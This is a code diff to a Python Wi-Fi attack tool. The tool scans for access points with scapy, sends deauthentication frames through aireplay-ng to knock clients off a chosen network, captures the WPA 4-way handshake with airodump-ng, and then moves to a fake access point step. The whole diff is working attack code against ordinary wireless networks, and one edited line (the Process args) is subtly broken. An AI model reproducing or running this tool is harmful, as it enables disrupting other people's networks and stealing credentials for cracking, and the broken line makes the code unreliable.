@@ -3,6 +3,7 @@ from scapy.all import *
 import time
 import os
 import conf_files as cf
+import re
 
 iface = ''
 bssid_name = ""
@@ -12,32 +13,29 @@ bssid_list = []
 essid_list = []
 channel_list = []
 
-def wifi_scanner():
-    #os.system('airodump-ng ' + iface)
+def ap_scanner():
     print("Scanning for access points...")
     print("press CTRL+C to stop the scanning")
     print("Index \tChannel \t MAC \t\t ESSID")
     #start the channel changer
-    sniff(iface = iface, prn = wifi_sniffer)
+    sniff(iface = iface, prn = ap_sniffer)
     #stop the channel changer
     
-def wifi_sniffer(pkt) :
+def ap_sniffer(pkt) :
     global bssid_list, essid_list, channel_list
     # if packet has 802.11 layer
     if pkt.haslayer(Dot11Beacon):
             if pkt.addr2 not in bssid_list:
                 channel = pkt.channel
                 channel_list.append(channel)
-                #bssid_list.append(pkt.addr2)
                 bssid = pkt[Dot11].addr2
                 bssid_list.append(bssid)
-                #essid_list.append(pkt.info)
                 essid = pkt[Dot11Elt].info.decode()
                 essid_list.append(essid)
                 print(len(bssid_list),'\t ',channel,'\t ',bssid,'\t ',essid)
 
-def deauth():
-    os.system(f"aireplay-ng -0 1 -a {bssid_name} {iface}")
+def deauth(dist):
+    os.system(f"aireplay-ng -0 {dist} -a {bssid_name} {iface}")
 
 def handshake_capture(): #look at fixing handshake capture and spoof mac address of client device once connected to rogue access point??
         global essid_name, bssid_name, channel_no
@@ -47,10 +45,10 @@ def handshake_capture(): #look at fixing handshake capture and spoof mac address
         channel_no = channel_list[mac_adder]
         print("\nNetwork to target:\n")
         print(channel_no,'\t',bssid_name,'\t', essid_name)
-        dist = int(input("\nEnter the number of the packets [1-10000] (0 for unlimited number) "))
+        dist = str(input("\nEnter the number of the packets [1-10000] (0 for unlimited number) "))
         print("Capturing 4-Way handshake [{}]...".format(bssid_name))
         #start deauthentication process
-        p_deauth = Process(target = deauth)
+        p_deauth = Process(target = deauth, args=(dist))
         p_deauth.start()
         #os.system(f"aireplay-ng -0 {dist} -a {bssid_name} {iface} | xterm -e airodump-ng {iface} --bssid {bssid_name} -c {channel_no} -w handshake")
         os.system(f"airodump-ng {iface} --bssid {bssid_name} -c {channel_no} -w handshake")
@@ -107,10 +105,10 @@ def main():
     iface = setup_monitor("wlan0")
     print("\nWhen Done Press CTRL+C")
     time.sleep(2)
-    p = Process(target = change_channel)
-    p.start()
-    wifi_scanner()
-    p.terminate()
+    cc = Process(target = change_channel)
+    cc.start()
+    ap_scanner()
+    cc.terminate()
     handshake_capture()
     print("Fake Access Point\nWhen Done Press CTRL+C")
     disable_monitor(iface)
